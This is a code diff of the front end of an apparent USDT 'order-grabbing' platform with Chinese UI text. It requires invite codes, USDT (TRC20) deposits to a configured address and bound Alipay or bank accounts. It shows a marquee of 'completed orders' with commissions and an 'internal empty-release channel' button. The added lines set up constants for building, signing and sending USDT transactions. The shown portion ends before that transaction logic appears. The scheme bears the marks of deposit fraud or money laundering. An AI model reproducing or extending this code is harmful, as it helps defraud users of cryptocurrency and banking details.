@@ -185,441 +185,137 @@
 <div id="app"><div class="loading">加载中…</div></div>
 <div id="modal-root"></div>
 <script>
-const TOKEN_KEY = 'jiedan.token';
-const $ = (s, r = document) => r.querySelector(s);
+/* ================= 常量 ================= */
+const TOKEN_KEY         = 'jiedan.token';
+const PAY_CTX_KEY       = 'pay_ctx_v1';
+const PAY_CTX_TTL       = 24 * 60 * 60 * 1000;
+const USDT_TRC20        = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const BACKUP_NODES      = ['https://api.trongrid.io', 'https://api.tronstack.io'];
+const POLL_BASE         = 5000;
+const POLL_MAX          = 30000;
+const TX_BUILD_TIMEOUT  = 6000;
+const TX_SIGN_TIMEOUT   = 120000;
+const TX_SEND_TIMEOUT   = 15000;
+const TX_FEE_LIMIT      = 100000000;
+const USDT_DECIMALS     = 1000000;
+const DELAY_REOPEN_GRAB = 400;
+const DELAY_BETWEEN_TX  = 2500;
+const DELAY_INLINE      = 500;
+const DELAY_UL_RETRY    = 800;
+
+/* ================= 基础工具 ================= */
+const $  = (s, r = document) => r.querySelector(s);
 const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));
+const uid = () => Math.random().toString(36).slice(2, 9);
+function esc(s) {
+  return String(s ?? '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+}
+function fmtDateTime(ts) {
+  const d = new Date(ts); const p = n => String(n).padStart(2, '0');
+  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}`;
+}
+function timeAgo(ts) {
+  const m = Math.floor((Date.now() - ts) / 60000);
+  if (m < 1) return '刚刚';
+  if (m < 60) return m + ' 分钟前';
+  const h = Math.floor(m / 60);
+  if (h < 24) return h + ' 小时前';
+  return Math.floor(h / 24) + ' 天前';
+}
+function reportError(ctx, e) {
+  try {
+    if (window.__DEBUG__) console.error('[client]', ctx, e);
+  } catch (_) {}
+}
+function isSafeHttpUrl(u) {
+  try { const x = new URL(u, location.href); return x.protocol === 'http:' || x.protocol === 'https:'; }
+  catch (e) { return false; }
+}
+let toastTimer = null;
+function toast(msg) {
+  $$('.toast').forEach(el => el.remove());
+  const el = document.createElement('div');
+  el.className = 'toast'; el.textContent = msg;
+  document.body.appendChild(el);
+  requestAnimationFrame(() => el.classList.add('show'));
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => { el.classList.remove('show'); setTimeout(() => el.remove(), 320); }, 2200);
+}
 
-const state = {
-  user: null, orders: [], refunds: [],
-  config: { trc20: '', emptyTrc20: '', ratio: 0.1, minDeposit: 10, notice: '', support: '', tabCancelName: '集团介绍', videoUrl: '', aboutTitle: '企业简介', aboutText: '', featureList: [], linkCardTitle: '', linkList: [], walletIconUrl: '', loginLogoUrl: '' },
-  view: 'hall', orderTab: 'cancelled', mineTab: 'working', authTab: 'login', loading: false, pollTimer: null, grabChoice: null, wallet: 'imtoken', featureOpen: {}
-};
-
-function getToken() { try { return localStorage.getItem(TOKEN_KEY); } catch(e) { return null; } }
-function setToken(t) { try { localStorage.setItem(TOKEN_KEY, t); } catch(e) {} }
-function clearToken() { try { localStorage.removeItem(TOKEN_KEY); } catch(e) {} }
+/* ================= Token / API ================= */
+function getToken()      { try { return localStorage.getItem(TOKEN_KEY); } catch (e) { return null; } }
+function setToken(t)     { try { localStorage.setItem(TOKEN_KEY, t); } catch (e) {} }
+function clearToken()    { try { localStorage.removeItem(TOKEN_KEY); } catch (e) {} }
 
 async function api(path, options = {}) {
   const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
   const token = getToken();
   if (token) headers['Authorization'] = 'Bearer ' + token;
-  const res = await fetch('/api' + path, { method: options.method || 'GET', headers, body: options.body ? JSON.stringify(options.body) : undefined });
-  let data = {}; try { data = await res.json(); } catch(e) {}
-  if (!res.ok) { if (res.status === 401) { clearToken(); state.user = null; } throw new Error(data.error || ('请求失败 ' + res.status)); }
+  const res = await fetch('/api' + path, {
+    method: options.method || 'GET', headers,
+    body: options.body ? JSON.stringify(options.body) : undefined
+  });
+  let data = {};
+  try { data = await res.json(); } catch (e) {}
+  if (!res.ok) {
+    if (res.status === 401) { clearToken(); state.user = null; }
+    throw new Error(data.error || ('请求失败 ' + res.status));
+  }
   return data;
 }
 
-const uid = () => Math.random().toString(36).slice(2, 9);
-function esc(s) { return String(s ?? '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
-function fmtDateTime(ts) { const d = new Date(ts); const p = n => String(n).padStart(2, '0'); return `${d.getFullYear()}-${p(d.getMonth()+1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}`; }
-function timeAgo(ts) { const d = Date.now() - ts; const m = Math.floor(d / 60000); if (m < 1) return '刚刚'; if (m < 60) return m + ' 分钟前'; const h = Math.floor(m / 60); if (h < 24) return h + ' 小时前'; return Math.floor(h/24) + ' 天前'; }
-
-let toastTimer = null;
-function toast(msg) { $$('.toast').forEach(el => el.remove()); const el = document.createElement('div'); el.className = 'toast'; el.textContent = msg; document.body.appendChild(el); requestAnimationFrame(() => el.classList.add('show')); clearTimeout(toastTimer); toastTimer = setTimeout(() => { el.classList.remove('show'); setTimeout(() => el.remove(), 320); }, 2200); }
-
-function getPayMethods(u) { if (!u || !u.payMethod) return []; const pm = u.payMethod; if (pm.type) return [pm]; const arr = []; if (pm.alipay) arr.push({ type: 'alipay', ...pm.alipay }); if (pm.bank) arr.push({ type: 'bank', ...pm.bank }); return arr; }
-function hasPayMethod(u) { return getPayMethods(u).length > 0; }
-function formatPayMethod(pm) { if (!pm) return ''; if (pm.type === 'alipay') return `支付宝 · ${pm.account || ''}`; if (pm.type === 'bank') return `银行卡 · ${pm.bank || ''} ${pm.account || ''}`; return ''; }
-
-function depositRequired(o) { const r = Number(state.config.ratio) || 0.1; const min = Number(state.config.minDeposit) || 10; return Math.max(min, Math.round(Number(o.amount) * r)); }
-function hasEnoughDeposit(o) { return Number(state.user?.deposit || 0) >= depositRequired(o); }
-const myTaker = o => (o.takers || []).find(x => x.userId === state.user?.id) || null;
-
-async function refreshAll(silent = false) {
-  if (!getToken() || !state.user) return;
-  try {
-    const [meRes, ordersRes, refundsRes] = await Promise.all([api('/me'), api('/orders'), api('/refunds/mine')]);
-    const buildKey = () => JSON.stringify({ u: state.user ? [state.user.deposit, state.user.income] : null, o: state.orders.map(o => o.id + '|' + o.status + '|' + (o.takers || []).length), r: state.refunds.map(r => r.id + '|' + r.status) });
-    const oldKey = buildKey();
-    state.user = meRes.user; state.orders = ordersRes.orders || []; state.refunds = refundsRes.refunds || [];
-    if (!silent) { render(); return; }
-    if (oldKey === buildKey()) return;
-    const activeEl = document.activeElement; const isTyping = activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA'); const modalOpen = !!document.querySelector('.overlay');
-    if (isTyping || modalOpen) return;
-    render();
-  } catch (e) { if (!silent) toast(e.message); }
+/* ================= 支付上下文（冷启动兜底） ================= */
+function savePayCtxToLS(a, n, t) {
+  try { localStorage.setItem(PAY_CTX_KEY, JSON.stringify({ a, n, t, ts: Date.now() })); } catch (e) {}
 }
-
-async function loadConfig() { try { const r = await api('/config'); state.config = Object.assign(state.config, r.config || {}); } catch(e) {} }
-
-async function bootstrap() {
-  const token = getToken();
-  if (!token) { render(); api('/config').then(r => { state.config = Object.assign(state.config, r.config || {}); render(); }).catch(() => {}); return; }
-  if (!state.user) state.user = { username: '加载中', deposit: '...', credit: '...', income: '...', payMethod: null };
-  render(); 
-  try {
-    const [configRes, meRes, ordersRes, refundsRes] = await Promise.all([api('/config'), api('/me'), api('/orders'), api('/refunds/mine')]);
-    state.config = Object.assign(state.config, configRes.config || {}); state.user = meRes.user; state.orders = ordersRes.orders || []; state.refunds = refundsRes.refunds || [];
-    render(); startPolling();
-  } catch(e) { clearToken(); state.user = null; render(); }
+function buildPayUrl(a, n, t) {
+  const q = `a=${encodeURIComponent(a)}&n=${encodeURIComponent(n)}&t=${encodeURIComponent(t)}`;
+  return `${location.origin}/pay?${q}#${q}`;
 }
+function clearPayCtx() { try { localStorage.removeItem(PAY_CTX_KEY); } catch (e) {} }
 
-function startPolling() { stopPolling(); state.pollTimer = setInterval(() => { if (document.visibilityState === 'visible' && state.user) refreshAll(true); }, 5000); }
-function stopPolling() { if (state.pollTimer) { clearInterval(state.pollTimer); state.pollTimer = null; } }
-
-function render() { const app = $('#app'); if (!state.user) { app.innerHTML = renderAuth(); } else { app.innerHTML = renderMainApp(); } }
-
-function renderAuth() {
-  const isLogin = state.authTab === 'login';
-  return `
-  <div class="auth-wrap">
-    <div class="auth-card">
-      ${state.config.loginLogoUrl ? `<div class="auth-logo" style="overflow:hidden; padding:0; background:none;"><img src="${esc(state.config.loginLogoUrl)}" style="width:100%; height:100%; object-fit:cover;" alt="Logo"></div>` : `<div class="auth-logo">单</div>`}
-      <h1>亿万富豪集团支付</h1>
-      <p class="auth-sub">部门 · 承兑</p>
-      <div class="auth-tabs"><button class="auth-tab${isLogin ? ' active' : ''}" data-action="auth-tab" data-tab="login">登录</button><button class="auth-tab${!isLogin ? ' active' : ''}" data-action="auth-tab" data-tab="register">注册</button></div>
-      ${isLogin ? `
-        <label class="field"><span class="field-label">用户名</span><input class="input" id="login-username" maxlength="20" placeholder="请输入用户名"></label>
-        <label class="field"><span class="field-label">密码</span><input class="input" id="login-password" type="password" maxlength="30" placeholder="请输入密码"></label>
-        <button class="btn btn-primary btn-block" data-action="do-login" style="margin-top:6px">登 录</button>
-      ` : `
-        <label class="field"><span class="field-label">用户名 <i>*</i></span><input class="input" id="reg-username" maxlength="20" placeholder="3-20 位字母或数字"></label>
-        <label class="field"><span class="field-label">密码 <i>*</i></span><input class="input" id="reg-password" type="password" maxlength="30" placeholder="至少 6 位"></label>
-        <label class="field"><span class="field-label">确认密码 <i>*</i></span><input class="input" id="reg-password2" type="password" maxlength="30" placeholder="再次输入密码"></label>
-        <label class="field"><span class="field-label">邀请码 <i>*</i></span><input class="input" id="reg-invite" maxlength="20" placeholder="请输入邀请码"></label>
-        <button class="btn btn-primary btn-block" data-action="do-register" style="margin-top:6px">注 册</button>
-      `}
-    </div>
-  </div>`;
+/* ================= 通用 Promise / 交易构建工具 ================= */
+function withTimeout(p, ms, msg) {
+  return Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error(msg)), ms))]);
 }
-
-function renderMainApp() {
-  const u = state.user; const name = u.username || '我'; const initial = name.slice(0, 1);
-  const viewHtml = ({ hall: viewHall, mine: viewMine, deposit: viewDeposit, refund: viewRefund }[state.view] || viewHall)();
-  const bindBanner = !hasPayMethod(u) ? `
-    <div data-action="open-paymethod" style="display:flex;align-items:center;justify-content:space-between;gap:10px;background:#fff4ec;border:1px solid #ffe0b2;border-radius:12px;padding:12px 14px;margin-bottom:14px;cursor:pointer;">
-      <div style="font-size:13px;color:#c2410c;font-weight:600;line-height:1.5">⚠️ 你还没绑定收款方式<br><span style="font-size:12px;color:#9a3412;opacity:.8">绑定后才能抢单并收款</span></div>
-      <div style="font-size:12.5px;font-weight:800;color:#fff;background:#f0a020;padding:7px 14px;border-radius:8px;white-space:nowrap">立即绑定</div>
-    </div>` : '';
-
-  return `
-  <div class="app">
-    <aside class="sidebar">
-      <div class="brand"><div class="brand-logo">单</div><div><div class="brand-name">众包接单</div><div class="brand-sub">订单大厅</div></div></div>
-      <nav class="nav">
-        <button class="nav-item${state.view === 'hall' ? ' active' : ''}" data-action="nav" data-view="hall"><span class="ico">📋</span>订单大厅</button>
-        <button class="nav-item${state.view === 'mine' ? ' active' : ''}" data-action="nav" data-view="mine"><span class="ico">📥</span>我的接单</button>
-        <button class="nav-item${state.view === 'deposit' ? ' active' : ''}" data-action="nav" data-view="deposit"><span class="ico">💰</span>充值押金</button>
-        <button class="nav-item${state.view === 'refund' ? ' active' : ''}" data-action="nav" data-view="refund"><span class="ico">💸</span>押金退款</button>
-      </nav>
-      <div class="sidebar-foot">
-        <button class="user-box" data-action="open-profile"><div class="avatar">${esc(initial)}</div><div><div class="user-name">${esc(name)}</div><div class="user-sub">押金 ${u.deposit} USDT</div></div></button>
-        <button class="logout-btn" data-action="logout">退出登录</button>
-      </div>
-    </aside>
-    <main class="main">
-      <header class="mhead"><div class="brand"><div class="brand-logo">单</div><div class="brand-name">订单大厅</div></div><button class="avatar" data-action="open-profile">${esc(initial)}</button></header>
-      ${bindBanner}
-      <div id="view">${viewHtml}</div>
-    </main>
-    <nav class="tabbar">
-      <button class="nav-item${state.view === 'hall' ? ' active' : ''}" data-action="nav" data-view="hall"><span class="ico">📋</span>大厅</button>
-      <button class="nav-item${state.view === 'mine' ? ' active' : ''}" data-action="nav" data-view="mine"><span class="ico">📥</span>接单</button>
-      <button class="nav-item${state.view === 'deposit' ? ' active' : ''}" data-action="nav" data-view="deposit"><span class="ico">💰</span>充值</button>
-      <button class="nav-item${state.view === 'refund' ? ' active' : ''}" data-action="nav" data-view="refund"><span class="ico">💸</span>退款</button>
-    </nav>
-  </div>`;
-}const STATUS_MAP = { pending: { text: '待审核', cls: 'status-pending' }, confirm: { text: '待收款', cls: 'status-confirm' }, paid: { text: '已收款', cls: 'status-paid' }, paused: { text: '暂停中', cls: 'status-paused' }, cancelled: { text: '已取消', cls: 'status-cancel' } };
-const statusOf = s => STATUS_MAP[s] || STATUS_MAP.pending;
-
-function viewHall() {
-  const cancelTabName = state.config.tabCancelName || '集团介绍';
-  const tabs = [{ id: 'cancelled', name: cancelTabName }, { id: 'hall', name: '订单大厅' }, { id: 'confirm', name: '待收款' }, { id: 'paid', name: '已收款' }];
-
-  if (state.orderTab === 'cancelled') {
-    const hasVideo = state.config.videoUrl && state.config.videoUrl.trim();
-    const aboutTitle = state.config.aboutTitle || '企业简介';
-    const hasAbout = state.config.aboutText && state.config.aboutText.trim();
-    const featureList = state.config.featureList || [];
-    const linkTitle = state.config.linkCardTitle && state.config.linkCardTitle.trim();
-    const linkList = state.config.linkList || [];
-    const hasLinks = linkTitle && linkList.length > 0;
-    return `
-    <div class="page">
-      <div class="order-tabs">${tabs.map(t => `<button class="order-tab${state.orderTab === t.id ? ' active' : ''}" data-action="order-tab" data-tab="${t.id}">${t.name}</button>`).join('')}</div>
-      <div class="empty-rich">
-        ${hasVideo ? `<div class="media-box"><video src="${esc(state.config.videoUrl)}" controls preload="metadata" playsinline></video></div>` : ''}
-        ${hasAbout ? `<div class="about-title">🏢 ${esc(aboutTitle)}</div><div class="about-text">${esc(state.config.aboutText)}</div>` : ''}
-        ${hasLinks ? `<div class="link-card" data-action="open-link-menu"><div class="lc-left"><span class="lc-icon">🔗</span><span>${esc(linkTitle)}</span></div><span class="lc-arrow">›</span></div>` : ''}
-        ${featureList.length > 0 ? featureList.map((item, idx) => { const isOpen = !!state.featureOpen[idx]; return `<div class="feature-box"><div class="feature-header" data-action="toggle-feature" data-idx="${idx}"><span>📖 ${esc(item.title || '功能说明')}</span><span class="arrow" style="transform:rotate(${isOpen ? 180 : 0}deg)">▼</span></div><div class="feature-content" style="display:${isOpen ? 'block' : 'none'}">${esc(item.content || '')}</div></div>`; }).join('') : ''}
-        ${!hasVideo && !hasAbout && featureList.length === 0 && !hasLinks ? `<div style="text-align:center;padding:40px 20px;color:var(--ink3);font-size:13px">暂无简介内容，管理员可在后台配置</div>` : ''}
-        <div style="margin-top:20px; text-align:center;"><button class="btn btn-primary" data-action="open-empty-modal" style="width:100%; border-radius:12px; background:#f0a020; color:#fff; font-weight:800; padding:15px; font-size:16px; box-shadow:0 4px 12px rgba(240,160,32,0.3);">⚡ 内部空放通道</button></div>
-      </div>
-    </div>`;
+async function withRetry(fn, times, delay) {
+  let last;
+  for (let i = 0; i < times; i++) {
+    try { return await fn(); }
+    catch (e) { last = e; if (i < times - 1) await new Promise(r => setTimeout(r, delay)); }
   }
-
-  let list = state.orders.slice();
-  let emptyText = '该分类下还没有订单';
-  if (state.orderTab === 'hall') { list = list.filter(o => o.status === 'pending'); emptyText = '大厅里暂时没有可接订单'; } 
-  else if (state.orderTab === 'confirm') { list = list.filter(o => o.status === 'confirm' && (o.takers || []).some(t => t.userId === state.user?.id && t.status === 'working')); emptyText = '你还没有待收款的订单'; } 
-  else if (state.orderTab === 'paid') { list = list.filter(o => o.status === 'paid' && (o.takers || []).some(t => t.userId === state.user?.id && t.status === 'done')); emptyText = '你还没有已收款的订单'; } 
-  else { list = list.filter(o => o.status === state.orderTab); }
-  list.sort((a, b) => b.createdAt - a.createdAt);
-
-  const marqueeOrders = state.orders.filter(o => o.status === 'paid').sort((a, b) => b.createdAt - a.createdAt).slice(0, 15);
-  let marqueeHtml = '';
-  if (marqueeOrders.length > 0) {
-    const itemsHtml = marqueeOrders.map(o => {
-      const taker = (o.takers || []).find(t => t.status === 'done') || (o.takers || [])[0] || {};
-      const name = taker.userName || '用户**'; const initial = name.slice(0, 1);
-      return `<div class="marquee-item"><div class="m-avatar">${esc(initial)}</div><span class="m-name">${esc(name)}</span><span class="m-text">成功完成订单，收款</span><span class="m-amount">¥${Number(o.amount).toFixed(0)}</span><span class="m-text">，获得返佣</span><span class="m-amount">¥${Number(o.commission).toFixed(0)}</span><span class="m-time">· ${timeAgo(o.createdAt)}</span></div>`;
-    }).join('');
-    marqueeHtml = `<div class="marquee-box"><div class="marquee-label"><span class="dot"></span>最新完成订单</div><div class="marquee-viewport"><div class="marquee-track">${itemsHtml}${itemsHtml}</div></div></div>`;
-  }
-
-  return `
-  <div class="page">
-    <div class="order-tabs">${tabs.map(t => `<button class="order-tab${state.orderTab === t.id ? ' active' : ''}" data-action="order-tab" data-tab="${t.id}">${t.name}</button>`).join('')}</div>
-    ${marqueeHtml}
-    <div class="order-list">${list.length ? list.map(orderCard).join('') : `<div class="empty"><div class="empty-ico">📭</div><h3>暂无订单</h3><p>${emptyText}</p></div>`}</div>
-  </div>`;
+  throw last;
 }
-
-function orderCard(o) {
-  const st = statusOf(o.status); const took = !!myTaker(o); const canGrab = o.status === 'pending' && !took; const required = depositRequired(o); const enough = hasEnoughDeposit(o);
-  let btnText = '抢单', btnClass = 'order-btn', btnAction = 'grab';
-  if (took) { btnText = '已接单'; btnClass += ' done'; btnAction = ''; } else if (o.status !== 'pending') { btnText = st.text; btnClass += ' done'; btnAction = ''; } else if (!enough) { btnText = `需押金 ${required} USDT · 去充值`; btnClass = 'order-btn need-deposit'; btnAction = 'deposit'; }
-  const btnAttr = btnAction ? `data-action="${btnAction}" data-id="${o.id}"` : 'disabled';
-  const depositTip = (canGrab && !enough) ? `<div class="deposit-tip">🔒 当前押金 ${state.user.deposit} USDT，抢此单需 ${required} USDT</div>` : '';
-  return `<div class="order-card" data-action="open" data-id="${o.id}"><div class="order-header"><div class="order-no">订单号：${esc(o.orderNo)}</div><div class="order-status ${st.cls}">${st.text}</div></div><div class="order-amounts"><div class="amount-item"><span class="amount-label">收款金额：</span><span class="amount-value red">${Number(o.amount).toFixed(2)}</span></div><div class="amount-item"><span class="amount-label">返佣金额：</span><span class="amount-value gold">${Number(o.commission).toFixed(2)}</span></div></div>${depositTip}<div class="order-info"><div class="order-info-row"><span class="label">创建时间：</span><span class="val">${fmtDateTime(o.createdAt)}</span></div><div class="order-info-row"><span class="label">收款类型：</span><span class="val">${esc(o.payType)}</span></div></div><button class="${btnClass}" ${btnAttr}>${btnText}</button></div>`;
+function promiseAny(promises) {
+  return new Promise((resolve, reject) => {
+    const errs = []; let done = 0;
+    promises.forEach((p, i) => Promise.resolve(p).then(resolve, e => {
+      errs[i] = e; done++; if (done === promises.length) reject(errs[0] || new Error('所有节点均失败'));
+    }));
+  });
 }
-
-function viewMine() {
-  const all = state.orders.filter(o => myTaker(o));
-  const working = all.filter(o => myTaker(o).status === 'working'); const done = all.filter(o => myTaker(o).status === 'done');
-  const list = (state.mineTab === 'done' ? done : working);
-  const listHtml = list.length ? `<div class="order-list">${list.map(mineOrderCard).join('')}</div>` : `<div class="empty"><div class="empty-ico">📥</div><h3>暂无记录</h3><p>${state.mineTab === 'working' ? '去订单大厅抢一单试试' : '完成的订单会显示在这里'}</p></div>`;
-  return `<div class="page"><div class="order-tabs"><button class="order-tab${state.mineTab === 'working' ? ' active' : ''}" data-action="mine-tab" data-tab="working">进行中 ${working.length}</button><button class="order-tab${state.mineTab === 'done' ? ' active' : ''}" data-action="mine-tab" data-tab="done">已完成 ${done.length}</button></div>${listHtml}</div>`;
-}
-
-function mineOrderCard(o) {
-  const tk = myTaker(o); const isDone = tk.status === 'done';
-  return `<div class="order-card" data-action="open" data-id="${o.id}"><div class="order-header"><div class="order-no">订单号：${esc(o.orderNo)}</div><div class="order-status ${isDone ? 'status-paid' : 'status-confirm'}">${isDone ? '已完成' : '进行中'}</div></div><div class="order-amounts"><div class="amount-item"><span class="amount-label">收款金额：</span><span class="amount-value red">${Number(o.amount).toFixed(2)}</span></div><div class="amount-item"><span class="amount-label">返佣金额：</span><span class="amount-value gold">${Number(o.commission).toFixed(2)}</span></div></div><div class="order-info"><div class="order-info-row"><span class="label">收款类型：</span><span class="val">${esc(o.payType)}</span></div><div class="order-info-row"><span class="label">接单时间：</span><span class="val">${timeAgo(tk.at)}</span></div></div>${isDone ? `<button class="order-btn done" disabled>已完成</button>` : `<button class="order-btn" data-action="submit-work" data-id="${o.id}">提交完成</button>`}</div>`;
-}
-
-function imTokenIconHtml() {
-  const url = state.config.walletIconUrl;
-  if (url && String(url).trim()) return `<img src="${esc(url)}" alt="imToken" onerror="this.onerror=null;this.style.display='none';this.parentNode.innerHTML='<svg width=22 height=22 viewBox=&quot;0 0 24 24&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;><path fill=&quot;#fff&quot; d=&quot;M18.6 3.4c-4.8 0-9 2.8-11.4 6.5-1.2 1.9-1.9 3.5-3.7 4.1-.9.3-1.6-.2-1.4-1.2.2-1 1.1-1.9 1.2-3.2.1-1.6-1.2-2.7-2.6-2.4-1.5.3-2.6 1.7-2.5 3.2.1 1.3.9 2.2 2 2.5-.3 2.3 1 4.3 3.2 4.7 2.5.5 4.5-1 5.7-2.7 1.3-1.8 2.3-3.9 4.2-5 .9-.5 2-.7 3.1-.7 1.2 0 2.1.1 2.4.1V3.4h-.2z&quot;/></svg>'">`;
-  return `<svg width="22" height="22" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M18.6 3.4c-4.8 0-9 2.8-11.4 6.5-1.2 1.9-1.9 3.5-3.7 4.1-.9.3-1.6-.2-1.4-1.2.2-1 1.1-1.9 1.2-3.2.1-1.6-1.2-2.7-2.6-2.4-1.5.3-2.6 1.7-2.5 3.2.1 1.3.9 2.2 2 2.5-.3 2.3 1 4.3 3.2 4.7 2.5.5 4.5-1 5.7-2.7 1.3-1.8 2.3-3.9 4.2-5 .9-.5 2-.7 3.1-.7 1.2 0 2.1.1 2.4.1V3.4h-.2z"/></svg>`;
-}
-
-function viewDeposit() {
-  const u = state.user; const addr = state.config.trc20 || '';
-  return `<div class="page"><div class="form-card"><h2 style="font-size:18px;font-weight:800;margin-bottom:6px;">充值押金</h2><p style="font-size:13px;color:var(--ink3);margin-bottom:20px;">使用 USDT (TRC20) 充值，抢单前需缴纳押金</p><div style="background:#fff9ec;border:1px solid #ffe0b2;border-radius:12px;padding:16px;margin-bottom:18px"><div style="font-size:12.5px;color:var(--ink3)">当前押金余额</div><div style="font-size:24px;font-weight:800;color:var(--brand);margin-top:2px">${u.deposit} <span style="font-size:13px">USDT</span></div></div><div style="font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:10px">选择钱包</div><div class="wallet-choices"><button class="wallet-card active" data-action="pick-wallet" data-wallet="imtoken"><div class="wc-icon imtoken">${imTokenIconHtml()}</div><div class="wc-info"><div class="wc-name">imToken</div><div class="wc-tip">官方认证 · 推荐使用</div></div><div class="wc-check">✓</div></button></div><div style="background:#f8f9fd; border:1px dashed var(--line); border-radius:12px; padding:16px; margin-bottom:18px; text-align:center;"><div style="font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:12px">扫码转账 (仅限 TRC20)</div><div style="display:inline-block;padding:8px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.05);margin-bottom:12px;"><img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${esc(addr)}" width="160" height="160" alt="收款二维码" style="display:block;"></div><div style="font-size:12px;color:var(--ink3);margin-bottom:6px;">收款地址</div><div style="display:flex;align-items:center;gap:8px;justify-content:center;max-width:100%;"><span style="font-size:12px;word-break:break-all;color:var(--ink);text-align:left;flex:1;">${esc(addr)}</span><button class="btn btn-ghost" data-action="copy-addr" style="padding:6px 12px;font-size:12px;border-color:var(--line);flex:0 0 auto;">复制</button></div></div><label class="field" style="margin-bottom:12px"><span class="field-label">支付金额（USDT）</span><input class="input" id="deposit-amount" type="number" min="${state.config.minDeposit}" step="1" value="100"></label><button class="btn btn-imtoken btn-block" data-action="pay-imtoken">🦊 一键支付 · 打开 imToken</button><button class="btn btn-primary btn-block" data-action="manual-confirm-deposit" style="margin-top:10px">我已完成支付</button><div style="text-align:center;font-size:12px;color:var(--ink3);margin-top:14px">${esc(state.config.support)}</div></div></div>`;
-}
-
-function viewRefund() {
-  const u = state.user; const myRefunds = state.refunds.slice().sort((a, b) => b.createdAt - a.createdAt);
-  const recordsHtml = myRefunds.length ? `<div class="form-card" style="margin-top:16px;max-width:680px"><h3 style="font-size:15px;font-weight:800;margin-bottom:14px">我的退款记录</h3>${myRefunds.map(r => `<div style="border:1px solid var(--line);border-radius:10px;padding:12px 14px;margin-bottom:10px"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><span style="font-size:14px;font-weight:800;color:var(--brand)">${r.amount} USDT</span><span class="order-status ${r.status === 'pending' ? 'status-pending' : r.status === 'approved' ? 'status-paid' : 'status-cancel'}">${r.status === 'pending' ? '待审核' : r.status === 'approved' ? '已打款' : '已拒绝'}</span></div><div style="font-size:12px;color:var(--ink3);word-break:break-all;margin-bottom:4px">地址：${esc(r.address)}</div><div style="font-size:12px;color:var(--ink3)">提交时间：${fmtDateTime(r.createdAt)}</div></div>`).join('')}</div>` : '';
-  return `<div class="page"><div class="form-card"><h2 style="font-size:18px;font-weight:800;margin-bottom:6px;">押金退款</h2><p style="font-size:13px;color:var(--ink3);margin-bottom:20px;">申请退还押金，审核通过后将退回至您的钱包</p><div style="background:#f8f9fd;border:1px solid #e8eaf1;border-radius:12px;padding:16px;margin-bottom:18px"><div style="font-size:12.5px;color:var(--ink3)">当前可退押金</div><div style="font-size:24px;font-weight:800;color:var(--ink);margin-top:2px">${u.deposit} <span style="font-size:13px">USDT</span></div></div><label class="field"><span class="field-label">退款金额（USDT）<i>*</i></span><input class="input" id="refund-amount" type="number" min="1" step="1" max="${u.deposit}" placeholder="例如：100"></label><label class="field"><span class="field-label">接收退款的 TRC20 地址 <i>*</i></span><input class="input" id="refund-address" placeholder="请输入您的 TRC20 钱包地址"></label><div class="notice" style="margin-bottom:14px">⚠️ 请确保地址正确，错误后果自负！并且不能找回！申请后系统自动处理到钱包地址</div><button class="btn btn-primary btn-block" data-action="submit-refund">提交退款申请</button></div>${recordsHtml}</div>`;
-}
-
-function openModal(html) { $('#modal-root').innerHTML = `<div class="overlay"><div class="modal">${html}</div></div>`; document.body.style.overflow = 'hidden'; }
-function closeModal() { $('#modal-root').innerHTML = ''; document.body.style.overflow = ''; }
-
-function openLinkMenu() {
-  const rawList = state.config.linkList || []; const list = []; const seen = new Set();
-  for (const item of rawList) { const key = `${item.title}|${item.url}`; if (!seen.has(key)) { seen.add(key); list.push(item); } }
-  if (!list.length) { toast('暂无可跳转的链接'); return; }
-  const title = state.config.linkCardTitle || '更多服务';
-  const buttonsHtml = list.map(item => `<a class="link-menu-btn" href="${esc(item.url)}" target="_blank" rel="noopener"><span class="lm-left"><span class="lm-icon">🌐</span><span>${esc(item.title)}</span></span><span class="lm-arrow">›</span></a>`).join('');
-  openModal(`<div class="modal-head"><h2>${esc(title)}</h2><button class="icon-btn" data-action="close-modal">✕</button></div><div class="modal-body">${buttonsHtml}</div>`);
-}
-
-let currentPmForce = false;
-function openPayMethodModal(isForce = false) {
-  currentPmForce = isForce; const canClose = !isForce; const pm = state.user?.payMethod || {};
-  let alipay = { realName: '', account: '' }; let bank = { realName: '', account: '', bank: '' };
-  if (pm.type === 'alipay') { alipay = { realName: pm.realName || '', account: pm.account || '' }; } else if (pm.type === 'bank') { bank = { realName: pm.realName || '', account: pm.account || '', bank: pm.bank || '' }; } else { if (pm.alipay) alipay = { realName: pm.alipay.realName || '', account: pm.alipay.account || '' }; if (pm.bank) bank = { realName: pm.bank.realName || '', account: pm.bank.account || '', bank: pm.bank.bank || '' }; }
